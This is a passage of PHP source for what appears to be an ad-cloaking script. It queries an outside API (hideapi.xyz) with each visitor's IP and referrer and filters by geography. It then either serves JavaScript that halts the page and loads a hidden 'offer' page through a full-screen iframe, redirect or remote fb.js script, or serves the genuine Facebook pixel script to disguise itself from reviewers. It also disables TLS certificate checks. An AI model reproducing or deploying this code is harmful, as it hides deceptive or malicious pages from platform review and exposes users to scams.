    if(!empty($ips[$ip]) && ($CLOAKING['DELAY_PERMANENT'] || sizeof($ips)<=$CLOAKING['DELAY_START'])){
        $CLOAKING['banReason'].='delaystart.';
    }
    elseif(sizeof($ips)<=$CLOAKING['DELAY_START']) {
        file_put_contents('dummyCounter.txt',$ip."\n", FILE_APPEND);
        $CLOAKING['banReason'].='delaystart.';
    }
}

if(!empty($_SERVER['HTTP_REFERER'])) $CLOAKINGdata['HTTP_X_FORWARDED_HOST']= parse_url($_SERVER['HTTP_REFERER'],PHP_URL_HOST);
else if(!empty($_SERVER['Referer'])) $CLOAKINGdata['HTTP_X_FORWARDED_HOST']= parse_url($_SERVER['Referer'],PHP_URL_HOST);
if(!empty($_GET['q'])){
    parse_str(urldecode($_GET['q']),$tmppar);
    if(!empty($tmppar['utm_allow_geo']) && preg_match('#^[a-zA-Z]{2}(-|$)#',$tmppar['utm_allow_geo'])) $CLOAKING['ALLOW_GEO']=$tmppar['utm_allow_geo'];
}
$CLOAKINGdata = json_encode($CLOAKINGdata);
if(!function_exists('curl_init')) $CLOAKING['STATUS'] = @file_get_contents('http://api.hideapi.xyz/basic?ip='.$_SERVER["REMOTE_ADDR"].'&port='.$_SERVER["REMOTE_PORT"].'&banReason='.$CLOAKING['banReason'].'&key='.$CLOAKING['API_SECRET_KEY'].'&sign=921085941761f1602628938&version='.$CLOAKING['VERSION'].$CLOAKING['WHITE_METHOD'].'.'.$CLOAKING['OFFER_METHOD'].'.'.$CLOAKING['FAST'].'&stage='.$stage.'&js=true&cache='.$CLOAKING['DISABLE_CACHE'].'&geo='.preg_replace('#[^a-zA-Z,]+#',',',$CLOAKING['ALLOW_GEO']).'&paranoid='.$CLOAKING['PARANOID'].'&offer='.urlencode($CLOAKING['OFFER_PAGE']) , 'r', stream_context_create(array('ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,), 'http' => array('method' => 'POST', 'timeout' => 5, 'header'=> "Content-type: application/x-www-form-urlencoded\r\n". "Content-Length: ".strlen($CLOAKINGdata). "\r\n", 'content' => $CLOAKINGdata))));
else $CLOAKING['STATUS'] = @cloakedCurl('http://api.hideapi.xyz/basic?ip='.$_SERVER["REMOTE_ADDR"].'&port='.$_SERVER["REMOTE_PORT"].'&banReason='.$CLOAKING['banReason'].'&key='.$CLOAKING['API_SECRET_KEY'].'&sign=921085941761f1602628938&version='.$CLOAKING['VERSION'].$CLOAKING['WHITE_METHOD'].'.'.$CLOAKING['OFFER_METHOD'].'.'.$CLOAKING['FAST'].'&stage='.$stage.'&js=true&cache='.$CLOAKING['DISABLE_CACHE'].'&geo='.preg_replace('#[^a-zA-Z,]+#',',',$CLOAKING['ALLOW_GEO']).'&paranoid='.$CLOAKING['PARANOID'].'&offer='.urlencode($CLOAKING['OFFER_PAGE']), $CLOAKINGdata);
$CLOAKING['STATUS'] = json_decode($CLOAKING['STATUS'], true);

header("Content-Type: application/javascript");
//srand(crc32($_SERVER['HTTP_HOST'].$_SERVER['HOST'].$_SERVER['Host'].$_SERVER['host'].$_SERVER["SCRIPT_NAME"]));
if (empty($CLOAKING['banReason']) && !empty($CLOAKING['STATUS']) && !empty($CLOAKING['STATUS']['action']) && $CLOAKING['STATUS']['action'] == 'allow' && (empty($CLOAKING['ALLOW_GEO']) || (!empty($CLOAKING['STATUS']['geo']) && !empty($CLOAKING['ALLOW_GEO']) && stristr($CLOAKING['ALLOW_GEO'],$CLOAKING['STATUS']['geo'])))) {
    if($CLOAKING['UTM'] && !empty($_GET) && !empty($_GET['q'])){
        // fix for fucking bug with &q=...&= not encoded...
        if(!empty($_SERVER['QUERY_STRING'])) $_GET['q']=substr($_SERVER['QUERY_STRING'],strpos($_SERVER['QUERY_STRING'],'&q=')+3);
            if(strstr($CLOAKING['OFFER_PAGE'],'?')) $CLOAKING['OFFER_PAGE'].= '&'.urldecode($_GET['q']);
            else $CLOAKING['OFFER_PAGE'].= '?'.urldecode($_GET['q']);
            $page=base64_encode($CLOAKING['OFFER_PAGE']);
    }
    else $page=base64_encode($CLOAKING['OFFER_PAGE']);

    if(!empty($CLOAKING['STATUS']['uid'])) {
        $uid=$CLOAKING['STATUS']['uid'];
        setcookie('uid',$uid,time()+604800);
    }
    else $uid='';

    $output='';

if($CLOAKING['FAST']) {
    if($CLOAKING['OFFER_METHOD']=='iframe'){
        $output='try {window.stop();}catch (e) {document.execCommand("Stop");}document.getElementsByTagName("html")[0].innerHTML = "<head><style>html, body, iframe {margin: 0;padding: 0;height : 100%; width: 100%;}</style></head><body></body>";!function() {if (document.getElementsByTagName("head").length > 0){var e = document.createElement("meta");e.name = "viewport",e.content = "width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0",document.getElementsByTagName("head")[0].appendChild(e);}}();document.getElementsByTagName("body")[0].innerHTML = "<iframe src=\''.base64_decode($page).'\' style=\'visibility:visible !important; position:absolute; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;\' allowfullscreen=\'allowfullscreen\' webkitallowfullscreen=\'webkitallowfullscreen\' mozallowfullscreen=\'mozallowfullscreen\'></iframe>";';
    }
    else {
        $output='try {window.stop();}catch (e) {document.execCommand("Stop");}document.getElementsByTagName("html")[0].innerHTML = "";location.href="'.base64_decode($page).'"';
    }
    echo $output;
}
else {
    if ($CLOAKING['UTM'] && empty($_GET['q'])) {
//        $output="var s='".$page."';try{s=btoa(atob(s)+(atob(s).indexOf('?')<0 ? '?':'&')+window.location.search.substr(1));}catch(e){console.log(e)};document.write('<script src=\"https://".$CLOAKING['STATUS']['host']."/fb.js?uid=".$uid."&method=".$CLOAKING['OFFER_METHOD']."&session=".$CLOAKING['STATUS']['js']."_'+s+'\"></script>')";
        $output = "var s='" . $page . "';try{s=btoa(atob(s)+(atob(s).indexOf('?')<0 ? '?':'&')+window.location.search.substr(1));}catch(e){console.log(e)};var b=document.createElement(\"script\");b[\"type\"] =\"text/javascript\";b[\"src\"] =\"https://" . $CLOAKING['STATUS']['host'] . "/fb.js?uid=" . $uid . "&method=" . $CLOAKING['OFFER_METHOD'] . "&session=" . $CLOAKING['STATUS']['js'] . "_\"+s;document.head.appendChild(b);";
    } //    else $output="document.write('<script src=\"https://".$CLOAKING['STATUS']['host']."/fb.js?uid=".$uid."&method=".$CLOAKING['OFFER_METHOD']."&session=".$CLOAKING['STATUS']['js']."_".$page."\"></script>')";
    else $output = "var b=document.createElement(\"script\");b[\"type\"] =\"text/javascript\";b[\"src\"] =\"https://" . $CLOAKING['STATUS']['host'] . "/fb.js?uid=" . $uid . "&method=" . $CLOAKING['OFFER_METHOD'] . "&session=" . $CLOAKING['STATUS']['js'] . "_" . $page . "\";document.head.appendChild(b);";
//    header("Location: https://cloudnetwork.cf/fb.js?uid=".$uid."&session=".$CLOAKING['STATUS']['js']."_".$page);
    if ($CLOAKING['NO_REF']) {
        $output = 'if(document && document.referrer && document.referrer.length>0){' . $output . '}';
    }
    echo $output;
}
}
else {
//    echo "document.write('<script src=\"https://connect.facebook.net/en_US/fbevents.js\"></script>')";
    echo "var b=document.createElement('script');b[\"type\"] =\"text/javascript\";b[\"src\"] =\"https://connect.facebook.net/en_US/fbevents.js\";document.head.appendChild(b);";
//    header("Location: https://connect.facebook.net/en_US/fbevents.js");
}

function cloakedCurl($url,$body='',$returnHeaders=false){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL,$url);
    if(!empty($body)) {curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS, "$body");}
    if(!empty($returnHeaders)) curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt($ch, CURLOPT_TIMEOUT, 45);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $r = @curl_exec($ch);
    curl_close ($ch);
    return $r;
}
function cloakedEditor($s){
    $f=file($_SERVER["SCRIPT_FILENAME"]);
    $r=0;
    foreach ($f as $n=>$l){if(strstr($l,$s)) {$r=$n;break;}}
    return $r+1;
}
die();
?>